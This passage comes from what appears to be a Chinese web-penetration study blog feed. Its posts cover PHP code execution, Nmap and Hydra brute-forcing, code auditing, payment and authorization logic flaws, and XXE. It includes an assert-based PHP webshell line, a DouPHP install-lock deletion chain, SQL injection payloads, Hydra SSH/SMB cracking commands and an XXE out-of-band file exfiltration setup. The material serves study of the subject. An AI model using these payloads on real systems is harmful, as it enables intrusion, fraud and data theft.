class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">//实现了数组$a的元素在函数cube()中的遍历</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">恶意代码具体实现:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;assert&#x27;</span>,<span class="variable">$_REQUEST</span>);</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//直接?8=phpinfo();   这里$_REQUEST是数组</span></span><br></pre></td></tr></table></figure><p>​                <strong>“${你要执行的代码}”</strong>  <strong>双引号二次解析</strong>/要注意*:不能是传参，只能是写在文件里              必须&gt;PHP5.6的版本才有这个漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;<span class="string">&quot;;  =&gt; 代码执行phpinfo()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//PHP的字符串是可以使用复杂的表达式。例如 $&#123;中间可以写调用的函数&#125;</span></span><br><span class="line"><span class="string">$&#123;phpinfo()&#125;; //可以执行</span></span><br><span class="line"><span class="string"><span class="subst">$a</span> = $&#123;phpinfo()&#125;; //可以执行</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//在PHP的官方文档中也有描述</span></span><br><span class="line"><span class="string">//https://www.php.net/manual/zh/language.types.string.php</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h1 id="代码执行经典案例"><a href="#代码执行经典案例" class="headerlink" title="代码执行经典案例"></a>代码执行经典案例</h1><p>dou_phpCMS的安装,通过安装时的数据库信息填写,我们做到了可以拿webshell。但是正常情况下，你不可能直接访问到这个安装</p><p>​    install.lock 存在就不能重装、不存在就可以重装<br>​    找个任意文件名修改漏洞、任意文件删除漏洞。  就可以进入重装页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">douphp 可以通过任意文件删除漏洞去删除安装锁</span><br><span class="line"></span><br><span class="line"> 任意文件删除漏洞 【???】</span><br><span class="line"></span><br><span class="line"> 危险函数定位法。 负责删除文件、文件重命名的函数 PHP</span><br><span class="line"> unlink</span><br><span class="line"> rename</span><br><span class="line"> move_uploaded_file</span><br><span class="line"></span><br><span class="line"> unlink(</span><br><span class="line"></span><br><span class="line"> $sql_filename = $backup-&gt;is_backup_file($_REQUEST[&#x27;sql_filename&#x27;], &#x27;backup.php&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    is_backup_file($_REQUEST[&#x27;sql_filename&#x27;], &#x27;backup.php&#x27;);</span><br><span class="line"></span><br><span class="line">    aaa( -X/E:/phpStudy/WWW/success.php )@qq.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @ unlink(ROOT_PATH . M_PATH . &#x27;/theme/&#x27; . $_CFG[&#x27;mobile_theme&#x27;] . &#x27;/images/&#x27; . $mobile_logo);</span><br><span class="line"></span><br><span class="line">     $mobile_logo = $dou-&gt;get_one(&quot;SELECT value FROM &quot; . $dou-&gt;table(&#x27;config&#x27;) . &quot; WHERE name = &#x27;mobile_logo&#x27;&quot;);</span><br><span class="line"></span><br><span class="line">    logo.png =&gt; ../../../../data/install.lock</span><br><span class="line"></span><br><span class="line">    config表里面的name = &#x27;mobile_logo&#x27;的值必须是 ../../../../data/install.lock</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach ($_REQUEST as $name =&gt; $value)  键值分离   传参名就是键，传参值就是值</span><br><span class="line">把键和值分来 </span><br><span class="line">$name 就是键盘，$value就是值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET :  8=KKKK</span><br><span class="line">$_GET =&gt; 预定义数组</span><br><span class="line">$_GET[8]/$_REQUEST[8] 名字为8的键  8=phpinfo();</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">一些常见的代码执行命令与经典案例</summary>
    
    
    
    <category term="web渗透" scheme="https://dtxharry.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="代码执行" scheme="https://dtxharry.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>内网信息收集(Nmap与Hydra)</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Nmap%E4%B8%8EHydra/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Nmap%E4%B8%8EHydra/</id>
    <published>2023-08-21T08:43:32.000Z</published>
    <updated>2023-08-22T01:36:22.171Z</updated>
    
    <content type="html"><![CDATA[<p>官方脚本：<br><a href="https://svn.nmap.org/nmap/scripts/">https://svn.nmap.org/nmap/scripts/</a><br>CVE查询：<br><a href="http://cve.scap.org.cn/">http://cve.scap.org.cn/</a><br><a href="http://cve.mitre.org/">http://cve.mitre.org/</a></p><h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a><strong>nmap</strong></h1><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>一 、检测存活在网络上的主机（主机发现）<br>二、 检测主机上开放的端口（端口发现或枚举）<br>三、 检测到相应的端口（服务发现）的软件和版本<br>四、 检测操作系统，硬件地址，以及软件版本<br>五、 检测脆弱性的漏洞（Nmap的脚本）</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>-sS :     TCP SYN扫描<br>-p:         指定端口号扫描<br>-v：      显示扫描过程<br>-F：    快速扫描<br>-Pn：   禁止ping后扫描: 跳过主机发现的过程进行端口扫描<br>-A：     全面的系统扫描:包括打开操作系统探测、版本探测、脚本扫描、路径跟踪</p><h2 id="扫描指定IP开放端口命令"><a href="#扫描指定IP开放端口命令" class="headerlink" title="扫描指定IP开放端口命令:"></a>扫描指定IP开放端口命令:</h2><p>nmap –sS -p 端口号 -v 192.168.1.2<br>使用半开放扫描，指定端口号1-65535，显示扫描过程</p><h2 id="穿透防火墙扫描命令："><a href="#穿透防火墙扫描命令：" class="headerlink" title="穿透防火墙扫描命令："></a>穿透防火墙扫描命令：</h2><p>nmap –Pn/P0 -A 192.168.1.2<br>服务器禁止ping命令，试试-Pn，nmap参数配合使用</p><h2 id="常用的端口扫描指令"><a href="#常用的端口扫描指令" class="headerlink" title="常用的端口扫描指令"></a>常用的端口扫描指令</h2><p>-sU :        UDP扫描（不可靠）<br>-sT:          TCP扫描<br>-sV：        扫描系统版本和程序版本检测<br>-T4：        默认3，越高扫描越快，但也容易被防火墙或IDS检测并屏蔽掉<br>-R:        反向域名解析<br>-sL—script=vuln     扫描常见的漏洞</p><h2 id="漏洞扫描命令"><a href="#漏洞扫描命令" class="headerlink" title="漏洞扫描命令:"></a>漏洞扫描命令:</h2><p>nmap —script=vuln 192.168.1.2<br>使用vuln脚本进行常见的漏洞扫描</p><h2 id="指纹识别扫描命令："><a href="#指纹识别扫描命令：" class="headerlink" title="指纹识别扫描命令："></a>指纹识别扫描命令：</h2><p>nmap -sV -v 192.168.1.2<br>扫描系统和程序版本号检测，并且输出详细信息</p><h2 id="端口扫描的状态"><a href="#端口扫描的状态" class="headerlink" title="端口扫描的状态"></a>端口扫描的状态</h2><p>Opend：端口开启<br>Closed：  端口关闭<br>Filtered：端口被过滤，数据没有到达主机，返回的结果为空，数据被防火墙拦截了<br>Unfiltered：未被过滤，数据有到达主机，但是不能识别端口的当前状态<br>Open|filtered：开放或者被过滤，端口没有返回值，主要发生在UDP、IP、FIN、NULL和Xmas扫描中<br>Closed|filtered：关闭或者被过滤，只发生在IP ID idle扫描</p><h2 id="把Nmap扫描结果保存到本地"><a href="#把Nmap扫描结果保存到本地" class="headerlink" title="把Nmap扫描结果保存到本地"></a>把Nmap扫描结果保存到本地</h2><h3 id="一、标准保存"><a href="#一、标准保存" class="headerlink" title="一、标准保存"></a>一、标准保存</h3><p>命令:<br>nmap –oN test.txt shop.aqlab.cn<br>标准保存会包输出结果保存到指定文件</p><h3 id="二、保存为xml格式"><a href="#二、保存为xml格式" class="headerlink" title="二、保存为xml格式"></a>二、保存为xml格式</h3><p>命令:<br>nmap –oX test.xml shop.aqlab.cn<br>保存为xml格式需要用浏览器打开，查看结果</p><h1 id="Hydra-九头蛇"><a href="#Hydra-九头蛇" class="headerlink" title="Hydra(九头蛇)"></a>Hydra(九头蛇)</h1><h2 id="命令"><a href="#命令" class="headerlink" title="命令:"></a>命令:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">常用:</span><br><span class="line">-l root    指定用户名</span><br><span class="line">-L    指定用户名字典 </span><br><span class="line"></span><br><span class="line">-p     指定密码</span><br><span class="line">-P      指定密码字典</span><br><span class="line"></span><br><span class="line">-s   指定非默认端口</span><br><span class="line">ssh 22 /1900</span><br></pre></td></tr></table></figure><p>-l LOGIN     指定破解的用户名称，对特定用户破解。<br>-L FILE     从文件中加载用户名进行破解。<br>-p PASS    小写p指定密码破解，少用，一般是采用密码字典。<br>-P FILE     大写字母P，指定密码字典。<br>-e nsr     可选选项，n：空密码试探，s：使用指定用户和密码试探，r：指定密码与用户名相反。<br>-C FILE     使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。<br>-t TASKS     同时运行的连接的线程数，每一台主机默认为16。<br>-M FILE     指定服务器目标列表文件一行一条<br>-w TIME     设置最大超时的时间，单位秒，默认是30s。<br>-o FILE     指定结果输出文件。<br>-f     在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。<br>-v / -V     显示详细过程。<br>-R     继续从上一次进度接着破解。<br>-S     采用SSL链接。<br>-s PORT     可通过这个参数指定非默认端口。<br>-U       服务模块使用细节<br>-h       更多的命令行选项（完整的帮助）<br>server      目标服务器名称或者IP（使用这个或-M选项）<br>service     指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等</p><p>OPT       一些服务模块支持额外的输入（-U用于模块的帮助）</p><h2 id="win密码破解"><a href="#win密码破解" class="headerlink" title="win密码破解"></a>win密码破解</h2><p>SMB服务很稳定，跑得快，不容易ban掉ip<br>hydra -l 用户名 -p 密码 smb://ip –v<br>或者hydra -l 用户名 -p 密码 ip smb –v   </p><h2 id="破解ssh"><a href="#破解ssh" class="headerlink" title="破解ssh"></a>破解ssh</h2><p>hydra -l 用户名 -P 密码字典 -t 线程 -vV -e nsr ip ssh<br>hydra -l 用户名 -P 密码字典 -t 线程 -o save.log -vV ip ssh<br>命令详细：<br>攻击目标：192.168.1.12<br>使用的模块：ssh<br>爆破用户名：root(-l)<br>使用的密码字典：/root/passwd.txt (-P)<br>爆破线程数：6 (-t)<br>显示详细信息 (-V)<br>爆破成功一个后停止 (-f)</p>]]></content>
    
    
    <summary type="html">内网渗透与web渗透一样,都是需要先进行信息收集</summary>
    
    
    
    <category term="内网渗透" scheme="https://dtxharry.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="渗透工具" scheme="https://dtxharry.github.io/categories/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="渗透工具" scheme="https://dtxharry.github.io/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
    <category term="内网" scheme="https://dtxharry.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>代码审计概述</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/</id>
    <published>2023-08-21T08:42:58.000Z</published>
    <updated>2023-08-21T14:56:12.179Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="好处"><a href="#好处" class="headerlink" title="好处:"></a>好处:</h2><p>1、可以挖掘到别人黑盒测试不出的漏洞<br>2、白盒测试大多都是CMS或者框架，只要找到一个漏洞就可能可以对成千上万个网站进行攻击。<br>3、会白盒代码审计，是未来的趋势，找工作的加分</p><h2 id="不好"><a href="#不好" class="headerlink" title="不好:"></a>不好:</h2><p>1、费脑子，审计过程中可能得掉头发<br>2、费时间，代码审计需要一定的时间</p><h2 id="代码审计核心"><a href="#代码审计核心" class="headerlink" title="代码审计核心:"></a>代码审计核心:</h2><p>看得懂代码</p><h2 id="基本方法"><a href="#基本方法" class="headerlink" title="基本方法:"></a>基本方法:</h2><h3 id="1-通读全文法"><a href="#1-通读全文法" class="headerlink" title="1.通读全文法"></a>1.通读全文法</h3><p> [从入口文件看，index.php] ,很费时间,需要好几天 </p><h3 id="2-定位危险函数发"><a href="#2-定位危险函数发" class="headerlink" title="2.定位危险函数发"></a>2.定位危险函数发</h3><p>[日常工作中],搜索关键的函数,比如sql注入肯定需要数据库函数支持的;<br>网站要实现功能，都是需要函数的支撑，我们找到函数来审计会比较简单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$id= &#x27; and updatexml(1,concat(&#x27;!&#x27;,database(),1) -- QWEQ</span><br><span class="line"></span><br><span class="line">get_one(  sql注入的危险函数</span><br><span class="line"></span><br><span class="line">strpos(&#x27;article&#x27;, &#x27;_category&#x27;) ? &#x27;cat_id&#x27; : &#x27;id&#x27;;</span><br><span class="line"></span><br><span class="line">三目运算符：</span><br><span class="line"></span><br><span class="line">条件?成立返回:不成立返回</span><br><span class="line"></span><br><span class="line">if(length(database())=6,1,sleep(10))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="小偏招"><a href="#小偏招" class="headerlink" title="小偏招"></a>小偏招</h2><p>小偏招，代码运行的时候，去修改代码</p>]]></content>
    
    
    <summary type="html">代码审计即白盒测试,可以挖掘到黑盒测试测不出的洞</summary>
    
    
    
    <category term="web渗透" scheme="https://dtxharry.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="代码审计" scheme="https://dtxharry.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>支付漏洞</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-08-21T08:42:50.000Z</published>
    <updated>2023-08-21T14:54:23.043Z</updated>
    
    <content type="html"><![CDATA[<h1 id="支付漏洞属于逻辑漏洞"><a href="#支付漏洞属于逻辑漏洞" class="headerlink" title="支付漏洞属于逻辑漏洞"></a>支付漏洞属于逻辑漏洞</h1><h1 id="支付过程"><a href="#支付过程" class="headerlink" title="支付过程"></a>支付过程</h1><p>用户[传参] -&gt; 商家[计算出] -&gt;第三方平台(支付宝) -&gt; 商家 -&gt;用户</p><h1 id="漏洞种类"><a href="#漏洞种类" class="headerlink" title="漏洞种类"></a>漏洞种类</h1><h2 id="1-修改支付价格"><a href="#1-修改支付价格" class="headerlink" title="1.修改支付价格"></a>1.修改支付价格</h2><p>支付三步曲——订购、订单、付款<br>三个步骤当中的随便一个步骤进行修改价格测试，如果前面两步有验证机制，那么你可在最后一步付款时进行抓包尝试修改金额，如果没有在最后一步做好检验，那么漏洞就会存在，其修改的金额值你可以尝试小数目或者尝试负数。</p><h2 id="2-修改支付状态"><a href="#2-修改支付状态" class="headerlink" title="2.修改支付状态"></a>2.修改支付状态</h2><p>订单完成——未完成（傻傻分不清）<br>A订单-0001完成——B订单-0002未完成<br>付款时尝试把订单B的单号给成订单A</p><h2 id="3-修改订单数量"><a href="#3-修改订单数量" class="headerlink" title="3.修改订单数量"></a>3.修改订单数量</h2><p>改成0或者-1,系统自动取绝对值</p><h2 id="4-修改附属值"><a href="#4-修改附属值" class="headerlink" title="4.修改附属值"></a>4.修改附属值</h2><h3 id="优惠劵"><a href="#优惠劵" class="headerlink" title="优惠劵"></a>优惠劵</h3><p>优惠劵其基本都是优惠，一般用优惠劵进行消费一般出现在第二个步骤当中：确认购买信息，在这个步骤页面当中，你可以选择相关优惠劵，然后直接修改金额大于或等于商品的价格就可以，或者直接修改其为负值进行尝试，最后进行支付，如果对这点没有加以验证，那么问题就会产生，直接支付成功</p><h3 id="修改运费支付漏洞"><a href="#修改运费支付漏洞" class="headerlink" title="修改运费支付漏洞"></a>修改运费支付漏洞</h3><p><code>http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-079085</code><br>也可以改成负数,总额=商品价格+运费,近乎白嫖</p><h2 id="5-越权支付"><a href="#5-越权支付" class="headerlink" title="5.越权支付"></a>5.越权支付</h2><p>主要针对有余额的平台,属于越权漏洞,但也算是个支付漏洞吧<br>存在user=id(123),这种传参时，尝试改改id,尝试用别人的钱包买自己的包包。</p><h2 id="6-跳过支付环节"><a href="#6-跳过支付环节" class="headerlink" title="6.跳过支付环节"></a>6.跳过支付环节</h2><p>抓包找到支付成功访问的页面，然后直接下个单子，复制订单号，然后拼接成功访问的页面<br><code>http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0108184</code><br><code>http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0188155</code></p><h1 id="防护方法"><a href="#防护方法" class="headerlink" title="防护方法"></a>防护方法</h1><h2 id="数据加密-有用-但不多"><a href="#数据加密-有用-但不多" class="headerlink" title="数据加密(有用,但不多)"></a>数据加密(有用,但不多)</h2><p>1.加密可能被解密<br>2.加密的数据也可以被复用<br>3.数据包中的加密是在前端加密的,因此会js的都能知道加密方法(因为抓包的时候就已经被加密了,请求还没发给服务器,因此一定是前端加密的)</p><h2 id="校验"><a href="#校验" class="headerlink" title="校验"></a>校验</h2><p>商品和钱的传参应该查询数据库做校验</p><h1 id="如何挖掘"><a href="#如何挖掘" class="headerlink" title="如何挖掘"></a>如何挖掘</h1><h2 id="找到关键的数据包"><a href="#找到关键的数据包" class="headerlink" title="找到关键的数据包"></a>找到关键的数据包</h2><p>​    可能一个支付操作有三四个数据包，我们要对数据包进行挑选。</p><h2 id="分析数据包"><a href="#分析数据包" class="headerlink" title="分析数据包"></a>分析数据包</h2><p>​    支付数据包中会包含很多的敏感信息（账号，金额，余额，优惠），要尝试对数据包中的各个参数进行分析。</p><h2 id="不按套路出牌"><a href="#不按套路出牌" class="headerlink" title="不按套路出牌"></a>不按套路出牌</h2><p>​    多去想想开发者没有想到的地方, pc端，wap端也看看，app也试试。</p>]]></content>
    
    
    <summary type="html">比较详细的展开讲解了一些支付漏洞的细节</summary>
    
    
    
    <category term="web渗透" scheme="https://dtxharry.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="逻辑漏洞" scheme="https://dtxharry.github.io/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>越权漏洞</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-08-21T08:42:40.000Z</published>
    <updated>2023-08-21T14:53:20.565Z</updated>
    
    <content type="html"><![CDATA[<h1 id="越权定义"><a href="#越权定义" class="headerlink" title="越权定义"></a>越权定义</h1><p>是一种很常见的逻辑安全漏洞.由于服务器端对客户提出的数据操作请求过分信任，忽略了对该用户操作权限的判定，导致修改相关参数就可以拥有了其他账户的增、删、查、改功能，从而导致越权漏洞,通俗的讲,我是普通用户,但是我做了管理员的操作,越过权限了.</p><h1 id="越权分类"><a href="#越权分类" class="headerlink" title="越权分类"></a>越权分类</h1><h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><p>普通用户做了管理员的操作</p><h2 id="平行越权"><a href="#平行越权" class="headerlink" title="平行越权"></a>平行越权</h2><p>相同权限的用户互相越权,A用户影响B用户或者A管理影响B管理</p><h2 id="交叉越权"><a href="#交叉越权" class="headerlink" title="交叉越权"></a>交叉越权</h2><p>既是平行越权也是垂直越权的越权</p><h1 id="与未授权访问的区别"><a href="#与未授权访问的区别" class="headerlink" title="与未授权访问的区别"></a>与未授权访问的区别</h1><p><strong>越权</strong>:你必然掌握了一定权限</p><p><strong>未授权访问</strong>:你肯定毫无权限.<br>不属于越权漏洞，但是在日常测试中常常会遇见（只要输入正确的网址就可以直接访问，例如/admin默认是登录，登录后跳转到user.php,然后你直接访问user.php，发现你直接有后台权限）(<a href="http://cn-sec.com/archives/9806.html),(http://cn-sec.com/archives/17524.html">http://cn-sec.com/archives/9806.html),(http://cn-sec.com/archives/17524.html</a>) (业务逻辑绕过） Web攻防之业务安全实战指南 (陈晓光 胡兵 张作峰 等 著)  </p><h1 id="常见的越权漏洞"><a href="#常见的越权漏洞" class="headerlink" title="常见的越权漏洞"></a>常见的越权漏洞</h1><p>1.通过修改GET传参来越权（<a href="http://cn-sec.com/archives/2572.html）(http://cn-sec.com/archives/2861.html">http://cn-sec.com/archives/2572.html）(http://cn-sec.com/archives/2861.html</a>)</p><p>2.修改POST传参进行越权（<a href="http://cn-sec.com/archives/1682.html）">http://cn-sec.com/archives/1682.html）</a></p><p>3.修改cookie传参进行越权（<a href="http://cn-sec.com/archives/6421.html）">http://cn-sec.com/archives/6421.html）</a></p><p>4.抓取传参可以在浏览器、APP、应用程序（exe）<a href="http://cn-sec.com/archives/5930.html">http://cn-sec.com/archives/5930.html</a></p><h1 id="越权测试过程"><a href="#越权测试过程" class="headerlink" title="越权测试过程"></a>越权测试过程</h1><h2 id="把握住传参就能把握住逻辑漏洞的命脉"><a href="#把握住传参就能把握住逻辑漏洞的命脉" class="headerlink" title="把握住传参就能把握住逻辑漏洞的命脉"></a><strong>把握住传参就能把握住逻辑漏洞的命脉</strong></h2><p>传参ID参数需要自己检测（常见：uid=  id= user= 等）<br>通常使用burp进行爆破传参（传参可能在GET POST COOKIE）<br>常见平行越权（不需要输入原密码的修改密码，抓包改用户名或者用户id修改他人密码修改资料的时候修改用户id查看订单的时候，遍历订单id等）</p>]]></content>
    
    
    <summary type="html">越权漏洞很常见的一种逻辑漏洞,写些我的一些想法</summary>
    
    
    
    <category term="web渗透" scheme="https://dtxharry.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="逻辑漏洞" scheme="https://dtxharry.github.io/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>XXE实体注入</title>
    <link href="https://dtxharry.github.io/2023/08/21/XXE%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
    <id>https://dtxharry.github.io/2023/08/21/XXE%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</id>
    <published>2023-08-21T08:42:23.000Z</published>
    <updated>2023-08-21T15:04:22.593Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XXE定义"><a href="#XXE定义" class="headerlink" title="XXE定义"></a>XXE定义</h1><p>XXE   ==  xml外部实体注入 (被各种后端脚本调用)<br>          =&gt;XML只存数据,除此以外不会做任何事情 (像HTML | 传输数据 | 无预定义)<br>          =&gt; 外部实体<br>          =&gt;注入 [用户输入的数据被当做代码执行]</p><h1 id="XML定义"><a href="#XML定义" class="headerlink" title="XML定义"></a>XML定义</h1><p>XML 指可扩展标记语言（EXtensible Markup Language）<br>XML 是一种标记语言，很类似 HTMLXML 的设计宗旨是传输数据，而非显示数据<br>XML 标签没有被预定义。您需要自行定义标签。XML 被设计为具有自我描述性。<br>XML 是 W3C 的推荐标准</p><p>特点：<br>XML仅仅是纯文本，他不会做任何事情。<br>XML可以自己发明标签（允许定义自己的标签和文档结构）<br>XML 无所不在。</p><p>XML 是各种应用程序之间进行数据传输的最常用的工具，并且在信息存储和描述领域变得越来越流行</p><p>前端代码:<br>                <code>&lt;b&gt;&lt;/b&gt;</code>加粗<br>                <code>&lt;h1&gt;&lt;/h1&gt;</code>大标题<br>XML:<br>                <code>&lt;b&gt;&lt;/b&gt;</code> 名字而已<br>                <code>&lt;h1&gt;&lt;/h1&gt;</code>名字而已</p><h1 id="XML结构"><a href="#XML结构" class="headerlink" title="XML结构"></a>XML结构</h1><p>​    <code>&lt;?xml version=&quot;1.0&quot;?&gt;</code>     //文件头部分</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">scan</span> [<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/1.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line">//DTD部分（通过特殊的命令去其他文件读取信息,就是文件包含,使用的关键字为SYSTEM）</span><br><span class="line">其中,scan是标签</span><br><span class="line"></span><br><span class="line">//test相当于自定义了变量,让包含的文件写入到test实体中</span><br></pre></td></tr></table></figure><p>​    <code>&lt;scan&gt;&amp;test;&lt;/scan&gt;</code>            //XML部分,表示test实体作用范围为scan标签</p><h1 id="XXE的寻找"><a href="#XXE的寻找" class="headerlink" title="XXE的寻找"></a>XXE的寻找</h1><h2 id="1-代码审计"><a href="#1-代码审计" class="headerlink" title="1.代码审计"></a>1.代码审计</h2><h3 id="高危函数"><a href="#高危函数" class="headerlink" title="高危函数"></a>高危函数</h3><p>simplexml_load_string()  //调用xml字符串并转换为实体对象<br>simplexml_load_file()     //读取xml文件并转化为实体对象</p><h3 id="数据外带"><a href="#数据外带" class="headerlink" title="数据外带"></a>数据外带</h3><p>大部分的xxe是没有回显的，我们不知道是否调用,所以可以考虑把数据外带出来：<br>    1、获取信息<br>    2、发送信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">XSS平台：</span><br><span class="line">你打XSS到目标站点 -&gt; 有人访问后把数据传到平台 -&gt; 记录下来，等你来看</span><br><span class="line"></span><br><span class="line">XML: 请求一个你自己搭建的php文件，其他的文件。（你想要的数据给带出来）</span><br><span class="line"> php文件记录请求的传参内容（记录文件）</span><br><span class="line"> 等你去看就可以了</span><br></pre></td></tr></table></figure><p>1.xml : 请求访问’<a href="http://127.0.0.1/WWW/2.php?id=%file">http://127.0.0.1/WWW/2.php?id=%file</a>‘.</p><p>1.php : (1) 将”PHP://filter/read=convert.base64-encode/resource=1.txt”实体化为 %file对象;<br>            (2)让 % remote 包含 1.xml 并执行<br>            (3)将(1)和(2)变为一个xml 类型的字符串 ,再实体化为 test</p><p>2.PHP : file_put_contents(“3.txt”,$_GET[“id”],FILE_APPEND); //php中的写文件函数,把id传参扩展追             加到3.TXT的内容后</p><h4 id="file-正常情况下是网站不应该使用的协议"><a href="#file-正常情况下是网站不应该使用的协议" class="headerlink" title="file:/// 正常情况下是网站不应该使用的协议"></a>file:/// 正常情况下是网站不应该使用的协议</h4><p>PHP伪协议（PHP的内部协议）<br>php://filter/read=convert.base64-encode/resource=a.txt</p><h4 id="为什么要进行base64编码"><a href="#为什么要进行base64编码" class="headerlink" title="为什么要进行base64编码?"></a>为什么要进行base64编码?</h4><p>以免特殊字符影响传参 :  <code>http://XXXX.php?id=12#45&amp;id=67</code> 